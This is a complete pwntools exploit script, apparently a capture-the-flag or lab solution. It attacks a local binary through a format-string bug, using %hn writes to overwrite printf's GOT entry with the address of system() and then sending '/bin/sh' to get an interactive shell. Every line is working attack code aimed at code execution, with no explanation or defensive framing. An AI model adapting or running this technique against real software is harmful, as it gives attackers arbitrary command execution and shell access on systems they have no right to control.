from pwn import *

p = process("./out");

#system address
val = 0xf7e0c830
#printf got address
address = 0x804c00c
#relative place in stack where given arguments appear
stack_num = 4

buf = p32(address)
buf += p32(address+2)

#number of bytes to write before hn
count = 0x0c830 - len(buf)

#change 2 LS bytes
buf += "%" + str(count) + "x%" + str(stack_num) + "$hn"

count = 0xf7e0-0x0c830

#change 2 MS bytes
buf += "%" + str(count) + "x%" + str(stack_num+1) + "$hn"

p.sendline(buf)
p.sendline("/bin/sh")
p.interactive()
